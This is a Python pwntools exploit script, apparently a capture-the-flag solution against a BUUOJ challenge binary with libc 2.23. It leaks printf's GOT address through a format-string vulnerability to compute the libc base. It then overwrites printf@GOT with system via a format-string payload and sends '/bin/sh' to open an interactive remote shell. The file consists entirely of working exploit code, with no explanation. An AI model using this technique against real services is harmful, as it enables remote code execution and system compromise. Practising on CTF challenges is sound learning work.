from pwn import *

sh=remote("node5.buuoj.cn",26209)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

printf_got=elf.got["printf"]
payload=p32(printf_got)+b"%6$s"
sh.recvuntil(b"Do you know repeater?\n")
sh.sendline(payload)
sh.recv(4)
printf_addr=u32(sh.recv(4))
libc_base=printf_addr-libc.sym["printf"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
payload1=fmtstr_payload(6,{printf_got:system_addr})
sh.sendline(payload1)
sh.sendline(b"/bin/sh\x00")

sh.interactive()
